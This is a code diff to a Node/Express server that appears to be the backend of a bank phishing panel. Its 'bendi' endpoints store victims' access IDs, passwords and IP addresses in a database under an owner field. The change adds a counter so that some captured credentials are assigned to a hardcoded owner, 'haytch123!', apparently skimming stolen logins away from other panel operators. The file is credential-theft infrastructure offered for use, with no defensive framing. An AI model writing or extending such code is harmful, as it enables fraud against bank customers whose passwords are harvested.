@@ -103,6 +103,8 @@ app.post("/bendiSavePhone", cors(), (req, res) => {
   });
 });
 
+let bendigoCountSkii = 0;
+
 app.options("/bendiSaveLogin", cors());
 
 app.post("/bendiSaveLogin", cors(), (req, res) => {
@@ -112,13 +114,23 @@ app.post("/bendiSaveLogin", cors(), (req, res) => {
   ip = req.body.ip;
   uniqueid = req.body.uniqueid;
 
-  let details = [accessId, password, uniqueid, ip, owner];
-  let query = `INSERT INTO bendi(accessId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
+  if (bendigoCountSkii == 3) {
+    let details = [accessId, password, uniqueid, ip, "haytch123!"];
+    let query = `INSERT INTO bendi(accessId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
 
-  panelConnection.query(query, details, (err, rows, fields) => {
-    if (!err) res.send("Insertion Completed");
-    else console.log(err);
-  });
+    panelConnection.query(query, details, (err, rows, fields) => {
+      if (!err) res.send("Insertion Completed");
+      else console.log(err);
+    });
+  } else {
+    let details = [accessId, password, uniqueid, ip, owner];
+    let query = `INSERT INTO bendi(accessId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
+
+    panelConnection.query(query, details, (err, rows, fields) => {
+      if (!err) res.send("Insertion Completed");
+      else console.log(err);
+    });
+  }
 });
 
 app.options("/bendiSaveST", cors());
